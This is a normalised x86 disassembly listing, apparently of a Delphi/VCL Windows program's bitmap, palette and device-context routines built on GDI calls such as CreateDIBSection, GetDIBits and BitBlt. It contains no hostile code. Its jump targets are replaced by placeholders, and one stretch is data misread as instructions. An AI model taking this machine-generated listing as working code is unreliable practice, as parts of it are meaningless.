cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov [ ebp - 0x28 ] 0x1
mov [ ebp - 0x26 ] 0x1
lea edx [ ebp - 0x2a ]
mov ecx 0x6
mov eax ebx
mov esi [ eax ]
call [ esi + 0x10 ]
mov esi [ ebp - 0x20 ]
mov eax esi
movzx edx [ eax + 0x4 ]
mov [ ebp - 0x54 ] dl
movzx edx [ eax + 0x8 ]
mov [ ebp - 0x53 ] dl
movzx edx [ eax + 0xc ]
imul dx [ eax + 0xe ]
mov [ ebp - 0x52 ] dx
mov eax [ ebp - 0xc ]
add eax [ ebp - 0x14 ]
add eax [ ebp - 0x10 ]
mov [ ebp - 0x4c ] eax
mov [ ebp - 0x48 ] 0x16
lea edx [ ebp - 0x54 ]
mov ecx 0x10
mov eax ebx
mov edi [ eax ]
call [ edi + 0x10 ]
mov eax esi
mov edx [ eax + 0x8 ]
add [ eax + 0x8 ] edx
mov edx [ ebp - 0x20 ]
mov ecx [ ebp - 0xc ]
mov eax ebx
mov esi [ eax ]
call [ esi + 0x10 ]
mov edx [ ebp - 0x24 ]
mov ecx [ ebp - 0x14 ]
mov eax ebx
mov esi [ eax ]
call [ esi + 0x10 ]
mov edx [ ebp - 0x1c ]
mov ecx [ ebp - 0x10 ]
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x10 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46fe14
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x20 ]
call sub_4474a8
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0x24 ]
call sub_4474a8
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x18 ]
call sub_4474a8
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0x1c ]
call sub_4474a8
retn
mov eax [ ebp - 0xc ]
add eax 0x16
add eax [ ebp - 0x14 ]
add eax [ ebp - 0x10 ]
mov [ ebp - 0x30 ] eax
lea edx [ ebp - 0x30 ]
mov ecx 0x4
mov eax ebx
mov esi [ eax ]
call [ esi + 0x10 ]
sub_46fe14
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46fe3b
mov eax [ ebp - 0x34 ]
push eax
call DeleteObject
mov eax [ ebp - 0x38 ]
push eax
call DeleteObject
retn
sub_46fe44
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_448180
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_448694
mov eax esi
pop esi
pop ebx
retn
call sub_4486ec
pop [ fs : 0x0 ]
add esp 0xc
sub_46fe94
push ebp
mov ebp esp
push ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp [ eax + 0x20 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ eax ]
call [ edx + 0x20 ]
xor al 0x1
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ebx [ eax + 0x20 ]
mov eax ebx
mov edx [ r-xdata ]
call sub_448388
test al al
je r-xdata
mov al 0x1
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov edx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x1c ]
test al al
je r-xdata
xor eax eax
jmp r-xdata
pop ebx
pop ebp
retn
sub_46feec
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ eax ]
mov eax [ eax + 0x34 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ eax ]
mov eax [ eax + 0x48 ]
push eax
push ebp
call sub_46fe94
pop ecx
mov ecx eax
mov edx r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x8 ]
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_46ff54
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
mov esi edx
mov ebx eax
test esi esi
je r-xdata
xor eax eax
mov edx [ ebx ]
mov eax edx
mov ecx [ esi ]
mov edx ecx
cmp edx eax
sete al
jmp r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x20 ]
test al al
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x20 ]
test al al
je r-xdata
mov [ ebp - 0x1 ] al
mov eax ebx
mov edx [ eax ]
call [ edx + 0x20 ]
test al al
jne r-xdata
xor eax eax
jmp r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x20 ]
test al al
jne r-xdata
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov [ ebp - 0x1 ] al
jmp r-xdata
mov al 0x1
movzx eax [ ebp - 0x1 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_448180
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_470081
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x8 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x48 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_448180
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_470064
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0xc ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x48 ]
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx ]
push edx
push eax
mov eax [ ebp - 0xc ]
mov edx [ eax ]
call [ edx ]
cmp edx [ esp + 0x4 ]
jne r-xdata
pop edx
pop eax
jne r-xdata
cmp eax [ esp ]
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx ]
mov ecx eax
mov eax [ ebp - 0xc ]
mov edx [ eax + 0x4 ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
call sub_434e78
test al al
jne r-xdata
mov [ ebp - 0x1 ] al
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47006b
mov eax [ ebp - 0xc ]
call sub_4481b0
retn
mov al 0x1
sub_470094
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ r-xdata ]
call sub_448388
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_44826c
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x1c ]
pop esi
pop ebx
retn
sub_4700d4
push ebp
mov ebp esp
push ecx
push esi
mov esi eax
push 0x20
mov ecx edx
mov eax [ r-xdata ]
mov dl 0x1
call sub_4277b4
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_47011c
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x4 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x5c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_470123
mov eax [ ebp - 0x4 ]
call sub_4481b0
retn
sub_470128
push ebp
mov ebp esp
push ebx
cmp [ eax + 0x1a ] 0x0
je r-xdata
pop ebx
pop ebp
retn 0x10
movzx ebx [ ebp + 0x14 ]
push ebx
movzx ebx [ ebp + 0x10 ]
push ebx
mov ebx [ ebp + 0xc ]
push ebx
mov ebx [ ebp + 0x8 ]
push ebx
mov ebx eax
mov eax [ ebx + 0x1c ]
call [ ebx + 0x18 ]
sub_470160
push ebp
mov ebp esp
push ecx
push esi
mov esi eax
push 0xffff
mov ecx edx
mov eax [ r-xdata ]
mov dl 0x1
call sub_4277b4
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_4701ab
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x4 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x60 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4701b2
mov eax [ ebp - 0x4 ]
call sub_4481b0
retn
sub_4701bc
push ebx
push esi
mov esi ecx
mov ebx eax
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x38 ]
pop esi
pop ebx
retn
sub_4701f8
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
js r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al [ fs : edi ]
insb
add [ eax ] al
add al cl
mov esp 0x826c0046
inc esp
add [ edx + eax * 4 + 0x44 ] dh
add [ esp + eax * 4 + 0x44 ] cl
add [ esp + eax * 4 + 0x44 ] al
add [ esp + eax * 4 + 0x44 ] ah
add [ eax - 0x7c ] ch
inc esp
add [ esp + eax * 4 + 0x44 ] ch
add [ eax - 0x7c ] ah
inc esp
add [ eax - 0x7f ] cl
inc esp
add [ ecx + eax * 4 + 0x44 ] ah
add [ eax ] al
add al 0x47
add [ eax - 0x67ffbdb2 ] dl
dec esi
inc edx
add al al
dec ebp
inc edx
add [ eax ] dh
0xea1c0046 0x46
inc edi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx + eax + 0x47 ] ah
add [ eax + eax ] ch
sub_47029c
push ebp
mov ebp esp
add esp 0xfffffff4
mov eax [ rw-data ]
call sub_424b88
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_47033a
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
dec eax
cmp eax 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_470341
mov eax [ rw-data ]
call sub_424bec
retn
mov [ ebp - 0x4 ] eax
dec [ ebp - 0x4 ]
cmp [ ebp - 0x4 ] 0xffffffff
jne r-xdata
xor eax eax
push ebp
push sub_470312
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
call sub_47042c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
call sub_46e7bc
retn
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
call sub_4246e8
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0xc ]
call sub_46e760
test al al
je r-xdata
sub_470348
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ rw-data ]
call sub_424b88
mov esi eax
xor ecx ecx
push ebp
push sub_4703b8
push [ fs : ecx ]
mov [ fs : ecx ] esp
mov ebx [ esi + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_424bec
retn
mov edx ebx
mov eax esi
call sub_4246e8
mov edx [ eax + 0x58 ]
test edx edx
je r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx [ edx + 0x28 ]
mov edx [ edx + 0x8 ]
cmp edx [ ebp - 0x4 ]
jne r-xdata
call sub_47042c
sub_4703c4
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_46e0ac
mov [ edi + 0x58 ] esi
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_448694
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_4486ec
pop [ fs : 0x0 ]
add esp 0xc
sub_470400
push ebx
push esi
call sub_44873c
mov ebx edx
mov esi eax
mov eax esi
call sub_47042c
mov edx ebx
and dl 0xfc
mov eax esi
call sub_46e170
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4486e4
sub_47042c
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_46e3b0
xor edx edx
push ebp
push sub_4704c0
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x5c ]
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x60 ]
test eax eax
je r-xdata
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call SelectObject
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x4 ]
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_46e950
push ebx
call DeleteDC
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_424b9c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_46e7bc
retn
push 0xffffffff
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call SelectPalette
sub_4704cc
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x58 ] 0x0
je r-xdata
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_46e3b0
xor eax eax
push ebp
push sub_4705ab
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x58 ]
call sub_471d2c
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x58 ]
mov eax [ eax + 0x28 ]
mov eax [ eax + 0x8 ]
call sub_470348
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x58 ]
call sub_471e2c
push 0x0
call CreateCompatibleDC
mov ebx eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x58 ]
mov eax [ eax + 0x28 ]
mov esi [ eax + 0x8 ]
test esi esi
je r-xdata
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x5c ] edx
push esi
push ebx
call SelectObject
mov edx [ ebp - 0x4 ]
mov [ edx + 0x5c ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x60 ] edx
push 0xffffffff
push esi
push ebx
call SelectPalette
mov edx [ ebp - 0x4 ]
mov [ edx + 0x60 ] eax
push ebx
call RealizePalette
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x58 ]
mov eax [ eax + 0x28 ]
mov esi [ eax + 0x10 ]
test esi esi
je r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_46e950
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_424ab8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_46e7bc
retn
sub_4705b8
push ebx
push esi
call sub_44873c
mov ebx edx
mov esi eax
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4481a0
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4486e4
sub_4705e4
push ebx
mov ebx eax
test ebx ebx
je r-xdata
pop ebx
retn
dec [ ebx + 0x4 ]
cmp [ ebx + 0x4 ] 0x0
jne r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx ]
mov eax ebx
call sub_4481b0
sub_470604
push ebx
push esi
call sub_44873c
mov ebx edx
mov esi eax
mov eax [ esi + 0x14 ]
test eax eax
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx ]
mov eax [ esi + 0x64 ]
test eax eax
je r-xdata
call sub_470348
mov eax [ esi + 0x14 ]
push eax
call DeleteObject
xor eax eax
mov [ esi + 0x14 ] eax
lea eax [ esi + 0x6c ]
mov edx [ eax ]
xor ecx ecx
mov [ eax ] ecx
mov eax edx
call sub_4481b0
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4705b8
test bl bl
jle r-xdata
push eax
call CloseHandle
pop esi
pop ebx
retn
mov eax esi
call sub_4486e4
sub_470668
push ebx
mov ebx eax
mov eax [ ebx + 0x8 ]
test eax eax
je r-xdata
mov eax [ ebx + 0xc ]
test eax eax
je r-xdata
call sub_470348
mov eax [ ebx + 0x8 ]
cmp eax [ ebx + 0x14 ]
je r-xdata
mov eax [ ebx + 0x10 ]
call sub_46c288
xor eax eax
mov [ ebx + 0x8 ] eax
xor eax eax
mov [ ebx + 0x10 ] eax
pop ebx
retn
call sub_470348
mov eax [ ebx + 0xc ]
push eax
call DeleteObject
xor eax eax
mov [ ebx + 0xc ] eax
push eax
call DeleteObject
sub_4706b4
push ebp
mov ebp esp
add esp 0xfffffbf0
push ebx
push esi
mov [ ebp - 0x4 ] edx
mov esi eax
test esi esi
je r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp [ ecx + 0x26 ] 0x8
ja r-xdata
lea edx [ ebp - 0x410 ]
mov ecx 0xff
mov eax [ ebp - 0x4 ]
call sub_46f45c
mov ebx eax
test ebx ebx
je r-xdata
push 0x0
call GetDC
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
push eax
call CreateCompatibleDC
mov [ ebp - 0xc ] eax
push esi
mov eax [ ebp - 0xc ]
push eax
call SelectObject
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_470763
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x410 ]
push eax
push ebx
push 0x0
mov eax [ ebp - 0xc ]
push eax
call SetDIBColorTable
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x10 ]
push eax
mov eax [ ebp - 0xc ]
push eax
call SelectObject
mov eax [ ebp - 0xc ]
push eax
call DeleteDC
mov eax [ ebp - 0x8 ]
push eax
push 0x0
call ReleaseDC
retn
sub_470770
test [ eax + 0x28 ] 0x3
je r-xdata
retn
cmp [ eax + 0x40 ] 0x0
jne r-xdata
movzx edx [ eax + 0x26 ]
cmp dx 0x10
jne r-xdata
cmp dx 0x20
jne r-xdata
mov [ eax + 0x40 ] 0xf800
mov [ eax + 0x44 ] 0x7e0
mov [ eax + 0x48 ] 0x1f
jmp r-xdata
mov [ eax + 0x40 ] 0xff0000
mov [ eax + 0x44 ] 0xff00
mov [ eax + 0x48 ] 0xff
sub_4707bc
push ebp
mov ebp esp
add esp 0xffffff68
push ebx
push esi
push edi
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
mov [ ebp - 0x10 ] eax
mov eax [ ebp + 0xc ]
cmp [ eax + 0x18 ] 0x0
je r-xdata
mov eax [ ebp + 0xc ]
cmp [ eax + 0x18 ] 0x0
jne r-xdata
mov eax [ ebp + 0xc ]
cmp [ eax + 0x1c ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_470348
xor eax eax
mov [ ebp - 0x70 ] eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax [ ebp + 0xc ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov eax [ ebp - 0x10 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov eax [ ebp + 0xc ]
cmp [ eax + 0x20 ] 0x0
je r-xdata
push 0x0
call GetDC
call sub_46ecc0
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x18 ]
push eax
call CreateCompatibleDC
call sub_46ecc0
mov [ ebp - 0x1c ] eax
xor edx edx
push ebp
push sub_470e0a
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp + 0xc ]
cmp [ eax + 0x18 ] 0x28
jae r-xdata
lea eax [ ebp - 0x88 ]
push eax
push 0x54
mov eax [ ebp - 0x4 ]
push eax
call GetObjectW
cmp eax 0x18
jge r-xdata
mov eax [ ebp + 0xc ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
mov eax 0x42c
call sub_44748c
mov [ ebp - 0x28 ] eax
xor edx edx
push ebp
push sub_470b14
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp + 0xc ]
mov [ eax + 0x18 ] 0x28
mov eax [ ebp + 0xc ]
mov [ eax + 0x24 ] 0x1
mov eax [ ebp + 0xc ]
cmp [ eax + 0x26 ] 0x0
jne r-xdata
mov eax [ ebp + 0xc ]
movzx eax [ eax + 0x10 ]
mov edx [ ebp + 0xc ]
or ax [ edx + 0x12 ]
cmp ax 0x1
jne r-xdata
call sub_46ebac
mov eax [ ebp + 0xc ]
mov edx [ ebp - 0x28 ]
lea esi [ eax + 0x18 ]
mov edi edx
mov ecx 0xa
[ edi ] [ esi ]
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x1c ]
mov edx [ ebp + 0xc ]
mov [ edx + 0x4 ] eax
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x20 ]
mov edx [ ebp + 0xc ]
mov [ edx + 0x8 ] eax
mov eax [ ebp + 0xc ]
cmp [ eax + 0x26 ] 0x8
ja r-xdata
push 0xc
mov eax [ ebp - 0x18 ]
push eax
call GetDeviceCaps
mov ebx eax
push 0xe
mov eax [ ebp - 0x18 ]
push eax
call GetDeviceCaps
imul bx ax
mov eax [ ebp + 0xc ]
mov [ eax + 0x26 ] bx
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x4 ]
push eax
mov eax [ ebp - 0x18 ]
push eax
call CreateCompatibleBitmap
call sub_46ecc0
mov [ ebp - 0x10 ] eax
jmp r-xdata
push 0x0
push 0x1
push 0x1
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x4 ]
push eax
call CreateBitmap
call sub_46ecc0
mov [ ebp - 0x10 ] eax
jmp r-xdata
mov eax [ ebp + 0xc ]
movzx eax [ eax + 0x26 ]
cmp ax 0x10
je r-xdata
mov eax [ ebp + 0xc ]
cmp [ eax + 0x26 ] 0x1
jne r-xdata
mov eax [ ebp - 0x10 ]
call sub_46ecc0
mov eax [ ebp - 0x10 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call SelectObject
call sub_46ecc0
mov [ ebp - 0x14 ] eax
xor eax eax
push ebp
push sub_470dbb
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
push ebp
push sub_470daa
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
mov [ ebp - 0x24 ] eax
xor ebx ebx
cmp [ ebp - 0xc ] 0x0
je r-xdata
mov eax [ ebp + 0xc ]
test [ eax + 0x28 ] 0x3
je r-xdata
mov edx [ ebp + 0xc ]
cmp ax 0x20
jne r-xdata
cmp [ ebp - 0xc ] 0x0
je r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
xor eax eax
push ebp
push sub_470d88
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp + 0x8 ] 0x0
je r-xdata
push 0x0
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call SelectPalette
mov [ ebp - 0x24 ] eax
mov eax [ ebp - 0x1c ]
push eax
call RealizePalette
push 0x0
push 0x0
lea eax [ ebp - 0x2c ]
push eax
push 0x0
mov eax [ ebp - 0x28 ]
push eax
mov eax [ ebp - 0x18 ]
push eax
call CreateDIBSection
call sub_46ecc0
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x2c ] 0x0
jne r-xdata
mov eax [ ebp + 0xc ]
call sub_470770
mov eax [ ebp - 0x28 ]
lea edx [ eax + 0x28 ]
mov eax [ ebp + 0xc ]
add eax 0x40
mov ecx 0xc
call sub_4476cc
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax [ ebp - 0x28 ]
lea edx [ eax + 0x28 ]
mov ecx 0xff
mov eax [ ebp - 0xc ]
call sub_46f45c
jmp r-xdata
mov eax [ ebp - 0x28 ]
xor edx edx
mov [ eax + 0x28 ] edx
mov eax [ ebp - 0x28 ]
add eax 0x28
add eax 0x4
mov [ eax ] 0xffffff
jmp r-xdata
cmp [ ebp - 0x74 ] 0x0
jne r-xdata
push 0xff0062
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x4 ]
push eax
push 0x0
push 0x0
mov eax [ ebp - 0x1c ]
push eax
call PatBlt
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x14 ]
call sub_46df70
push eax
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x8 ]
push eax
lea eax [ ebp - 0x98 ]
push eax
mov ecx [ ebp + 0xc ]
mov ecx [ ecx + 0x4 ]
xor edx edx
xor eax eax
call sub_432a2c
lea eax [ ebp - 0x98 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call FillRect
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0xc ]
mov eax [ eax + 0x18 ]
call sub_46cf24
push eax
mov eax [ ebp - 0x1c ]
push eax
call SetTextColor
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x14 ]
call sub_46df14
call sub_46cf24
push eax
mov eax [ ebp - 0x1c ]
push eax
call SetBkColor
mov eax [ ebp + 0xc ]
cmp [ eax + 0x26 ] 0x1
jne r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
call sub_46ec18
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call SelectObject
mov [ ebp - 0x14 ] eax
cmp [ ebp - 0x70 ] 0x0
jbe r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_470d8f
cmp [ ebp - 0xc ] 0x0
je r-xdata
mov eax [ ebp - 0x18 ]
push eax
call CreateCompatibleDC
call sub_46ecc0
mov [ ebp - 0x20 ] eax
xor eax eax
push ebp
push sub_470d5e
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x20 ]
push eax
call SelectObject
call sub_46ecc0
mov esi eax
cmp [ ebp - 0x8 ] 0x0
je r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax [ ebp + 0xc ]
cmp [ eax + 0x14 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x28 ]
call sub_4474a8
retn
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x1c ]
cmp eax [ ebp - 0x84 ]
jne r-xdata
push 0x0
mov eax [ ebp - 0x28 ]
push eax
push 0x0
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x20 ]
cdq
xor eax edx
sub eax edx
push eax
push 0x0
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call GetDIBits
cmp [ ebp - 0x74 ] 0x0
je r-xdata
retn
push 0xffffffff
mov eax [ ebp - 0x24 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call SelectPalette
cmp [ ebp + 0x8 ] 0x0
je r-xdata
push 0x0
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x20 ]
push eax
call SelectPalette
mov ebx eax
mov eax [ ebp - 0x20 ]
push eax
call RealizePalette
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0xc ]
mov eax [ eax + 0x18 ]
call sub_46cf24
mov [ ebp - 0x34 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x14 ]
call sub_46df14
call sub_46cf24
mov [ ebp - 0x30 ] eax
lea eax [ ebp - 0x34 ]
push eax
push 0x2
push 0x0
mov eax [ ebp - 0x1c ]
push eax
call SetDIBColorTable
jmp r-xdata
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x20 ]
cmp eax [ ebp - 0x80 ]
jne r-xdata
mov eax [ ebp - 0x28 ]
add eax 0x28
push eax
push 0x100
push 0x0
mov eax [ ebp - 0x1c ]
push eax
call GetDIBColorTable
mov edx [ ebp + 0xc ]
mov [ edx + 0x38 ] eax
jmp r-xdata
push 0xcc0020
push 0x0
push 0x0
mov eax [ ebp - 0x20 ]
push eax
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x4 ]
push eax
push 0x0
push 0x0
mov eax [ ebp - 0x1c ]
push eax
call BitBlt
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0xc ]
mov eax [ eax + 0x18 ]
call sub_46cf24
push eax
mov eax [ ebp - 0x20 ]
push eax
call SetTextColor
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x14 ]
call sub_46df14
call sub_46cf24
push eax
mov eax [ ebp - 0x20 ]
push eax
call SetBkColor
mov eax [ ebp + 0xc ]
cmp [ eax + 0x26 ] 0x8
jbe r-xdata
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call SelectObject
jmp r-xdata
push esi
mov eax [ ebp - 0x20 ]
push eax
call SelectObject
call sub_46ecc0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x20 ]
push eax
call DeleteDC
retn
push 0xffffffff
push ebx
mov eax [ ebp - 0x20 ]
push eax
call SelectPalette
push 0x0
mov eax [ ebp - 0x28 ]
push eax
mov eax [ ebp - 0x2c ]
push eax
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x20 ]
cdq
xor eax edx
sub eax edx
push eax
push 0x0
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call GetDIBits
